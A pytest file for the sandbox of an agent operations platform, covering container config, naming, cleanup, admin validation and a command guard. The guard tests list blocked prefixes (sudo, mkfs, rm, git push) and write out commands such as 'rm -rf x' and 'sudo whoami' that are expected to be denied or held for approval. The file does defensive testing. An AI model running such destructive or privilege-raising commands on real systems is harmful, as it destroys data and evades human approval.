    """ResolvedCfg 解析：缺省值 + 字符串形态（管理台回传）+ 脏值/非正数兜底。"""
    from sandbox.executor import SandboxExecutor

    e = SandboxExecutor()
    rc = e._cfg({})
    assert rc.image == "python:3.11-slim" and rc.network_mode == "bridge" and rc.pids_limit == 256
    assert rc.max_containers == 26 and rc.ttl_minutes == 15 and rc.cpu == 0.5 and rc.mem_mib == 2048
    rc2 = e._cfg({"container_pids_limit": "512", "container_memory_limit_mib": "1024",
                  "max_user_containers_per_host": "10", "container_cpu_limit": "1.5",
                  "container_image": "openops-sandbox:v1"})
    assert rc2.pids_limit == 512 and rc2.mem_mib == 1024 and rc2.max_containers == 10 and rc2.cpu == 1.5
    assert rc2.image == "openops-sandbox:v1"
    assert e._cfg({"container_pids_limit": "abc"}).pids_limit == 256   # 非数字 → 兜底
    assert e._cfg({"container_pids_limit": -1}).pids_limit == 256      # <=0 → 兜底
    assert e._cfg({"container_image": "  "}).image == "python:3.11-slim"  # 空白 → 默认


def test_cfg_network_mode_validation_and_fallback():
    from sandbox.executor import SandboxExecutor

    e = SandboxExecutor()
    assert e._cfg({"container_network_mode": "none"}).network_mode == "none"
    assert e._cfg({"container_network_mode": " NONE "}).network_mode == "none"  # 大小写/空白归一
    assert e._cfg({}).network_mode == "bridge"
    assert e._cfg({"container_network_mode": "host"}).network_mode == "bridge"  # 非法 → 回退 bridge


def test_container_name_charset_and_determinism():
    import re

    from sandbox.backends import container_name

    pat = re.compile(r"^[a-zA-Z0-9][a-zA-Z0-9_.-]*$")
    ids = ["0026demo01", "用户@x/y", "-lead__", "l" * 96, "l00833445"]
    names = [container_name(x) for x in ids]
    for n in names:
        assert pat.match(n), n
    assert len(set(names)) == len(names)  # 互异（哈希兜唯一）
    assert container_name("0026demo01") == container_name("0026demo01")  # 确定性


def test_orphan_ids_scope_filter():
    from sandbox.backends import LABEL_MANAGED, LABEL_SCOPE, orphan_container_ids

    rows = [
        {"Id": "a", "Labels": {LABEL_MANAGED: "1", LABEL_SCOPE: "default"}},
        {"Id": "b", "Labels": {LABEL_MANAGED: "1", LABEL_SCOPE: "prod"}},
        {"Id": "c", "Labels": {}},                       # 非托管
        {"Id": "d", "Labels": {LABEL_MANAGED: "1"}},     # 无 scope label → 视作 default
    ]
    assert orphan_container_ids(rows, "default") == ["a", "d"]
    assert orphan_container_ids(rows, "prod") == ["b"]


def test_deny_prefixes_parse_string_and_list():
    from sandbox.command_guard import parse_deny_prefixes

    assert parse_deny_prefixes("docker, sudo ,,mkfs") == ["docker", "sudo", "mkfs"]
    assert parse_deny_prefixes(["rm", "git push"]) == ["rm", "git push"]
    assert parse_deny_prefixes(None) == [] and parse_deny_prefixes("") == []
    assert parse_deny_prefixes("docker") == ["docker"]  # 回归：字符串绝不拆成单字符前缀


def test_admin_sandbox_put_rejects_bad_values(client):
    """写时校验：非法网络模式/pids 被拒 400；合法值 200 且回读生效。"""
    base = "/api/openops/v1/admin/sandbox"
    r = client.put(base, headers=ADMIN_HEADERS,
                   json={"client_request_id": "s1", "updates": {"container_network_mode": "host"}, "reason": "x"})
    assert r.status_code == 400
    unwrap(client.put(base, headers=ADMIN_HEADERS,
                      json={"client_request_id": "s2", "updates": {"container_network_mode": "none"}, "reason": "切断网"}))
    rows = unwrap(client.get(base, headers=ADMIN_HEADERS))
    assert next(x for x in rows if x["key"] == "container_network_mode")["val"] == "none"
    r2 = client.put(base, headers=ADMIN_HEADERS,
                    json={"client_request_id": "s3", "updates": {"container_pids_limit": "-1"}, "reason": "x"})
    assert r2.status_code == 400


def test_sweep_once_reclaims_by_db_ttl(client):
    """后台回收现读 DB cfg：把 idle TTL 改 0 → sweep_once 回收该容器（区别于直接传 cfg 的 sweep_idle）。"""
    from app import sandbox_admin_service
    from infra.repositories import runtime_config

    async def scenario():
        await sandbox_executor.ensure_user_container("uSweep", "r1", _CFG)
        await sandbox_executor.release_user_container("uSweep", "r1")  # → idle
        assert sandbox_executor.get("uSweep") is not None
        await runtime_config.upsert(runtime_config.DOMAIN_SANDBOX, "user_container_idle_ttl_minutes", 0, reason="t")
        n = await sandbox_admin_service.sweep_once()
        assert n >= 1 and sandbox_executor.get("uSweep") is None

    asyncio.run(scenario())


def test_seeded_deny_blocks_in_run_bash(client):
    """种子 deny 端到端：从 DB 读 sandbox cfg → sudo 命中层 1 平台 deny（denied+审计），ls 照常放行。"""
    from infra.repositories import runtime_config
    from runtime import sandbox_bash
    from runtime.task_registry import TaskState

    instance = create_instance(client)
    run_row = unwrap(client.post("/api/openops/v1/agent-runs", headers=USER_HEADERS,
                                 json={"client_request_id": "deny1", "agent_team_instance_id": instance["instance_id"]}))["run"]
    run = _run_dict(run_row)
    st = TaskState(task_id="tk", run_id=str(run["agent_run_id"]), user_id="0026demo01",
                   instance_id=instance["instance_id"], input_text="x")

    async def scenario():
        cfg = {c["config_key"]: c["config_value_json"]
               for c in await runtime_config.get_domain(runtime_config.DOMAIN_SANDBOX)}
        assert cfg.get("bash_deny_prefixes")  # 种子键已入库

        async def approve():
            return True

        res = await sandbox_bash.run_bash(st, run, "sudo whoami", cfg=cfg, approver=approve)
        assert res.status == "denied"
        res2 = await sandbox_bash.run_bash(st, run, "ls -la", cfg=cfg, approver=approve)
        assert res2.status == "success"

    asyncio.run(scenario())
    events = unwrap(client.get(f"/api/openops/v1/audit/runs/{run['agent_run_id']}", headers=USER_HEADERS))
    denied = next(e for e in events if e["event_type"] == "openops.sandbox.command.denied")
    assert denied["payload_redacted_json"]["layer"] == 1  # 层 1 平台 deny


def test_seed_ensure_defaults_inserts_missing_keeps_existing(client):
    """ensure_sandbox_defaults：老库缺新键自动补齐，管理员改过的值不被回写。"""
    from infra import seed
    from infra.db import exec1
    from infra.repositories import runtime_config

    async def scenario():
        await runtime_config.upsert(runtime_config.DOMAIN_SANDBOX, "container_pids_limit", 999, reason="admin")
        await exec1("delete from sre_platform_runtime_config where config_domain=%(d)s and config_key=%(k)s",
                    {"d": runtime_config.DOMAIN_SANDBOX, "k": "container_image"})
        before = {c["config_key"] for c in await runtime_config.get_domain(runtime_config.DOMAIN_SANDBOX)}
        assert "container_image" not in before
        await seed.ensure_sandbox_defaults()
        cfg = {c["config_key"]: c["config_value_json"]
               for c in await runtime_config.get_domain(runtime_config.DOMAIN_SANDBOX)}
        assert cfg["container_pids_limit"] == 999          # 改值不回写
        assert cfg["container_image"] == "python:3.11-slim"  # 缺键补齐

    asyncio.run(scenario())


@pytest.mark.skipif(os.getenv("OPENOPS_SANDBOX_DOCKER_TEST") != "1",
                    reason="实机 Docker 配置应用：设 OPENOPS_SANDBOX_DOCKER_TEST=1 且本机有 docker + python:3.11-slim 才跑")
def test_docker_real_config_applied(client):
    """实机断言：Name/Labels/PidsLimit/NetworkMode 生效 + 409 同名自愈 + purge 归零。"""
    from sandbox.backends import (
        LABEL_MANAGED,
        DockerContainerBackend,
        container_name,
        purge_orphan_containers,
    )

    async def scenario():
        be = DockerContainerBackend("uCfg", image="python:3.11-slim", cpu=0.5, mem_mib=512,
                                    network_mode="none", pids_limit=64)
        await be.start()
        try:
            info = await be._container.show()
            assert info["Name"] == "/" + container_name("uCfg")
            assert info["Config"]["Labels"][LABEL_MANAGED] == "1"
            assert info["HostConfig"]["PidsLimit"] == 64
            assert info["HostConfig"]["NetworkMode"] == "none"
            # 409 自愈：同名再建应删旧建新成功
            be2 = DockerContainerBackend("uCfg", image="python:3.11-slim", cpu=0.5, mem_mib=512)
            await be2.start()
            await be2.close()
        finally:
            await be.close()
        await purge_orphan_containers()  # 清本 scope 所有托管容器

    asyncio.run(scenario())


def test_guard_read_only_allows_diagnostics_asks_mutations():
    """只读诊断命令自动放行（ps/df/netstat/systemctl status/kubectl get/journalctl/管道/&&/2>/dev/null），
    真变更/未识别命令仍走审批（rm/kubectl delete/systemctl restart/mv/写真实文件重定向）；层1 deny 最高优先。
    两 runtime 一致（agentscope PASSTHROUGH→guard 层3 / 无 agentscope→fallback，均用 _guard_read_only）。"""
    from sandbox.command_guard import decide_async

    async def act(c, deny=None):
        return (await decide_async(c, deny_prefixes=deny or [])).action

    async def scenario():
        for c in ["ps aux", "df -h", "free -m", "netstat -tlnp", "ss -tlnp", "lsof -i:80",
                  "systemctl status nginx", "journalctl -u nginx", "kubectl get pods", "docker ps",
                  "ps aux | grep nginx", "ls && df -h", "netstat -tlnp 2>/dev/null", "whoami", "git status"]:
            assert await act(c) == "allow", c
        for c in ["rm -rf x", "kubectl delete pod x", "systemctl restart nginx", "mv a b",
                  "ps aux > /tmp/out"]:
            assert await act(c) == "ask", c
        assert await act("sudo whoami", ["sudo"]) == "deny"  # 层1 平台 deny 最高优先，只读也拦

    asyncio.run(scenario())
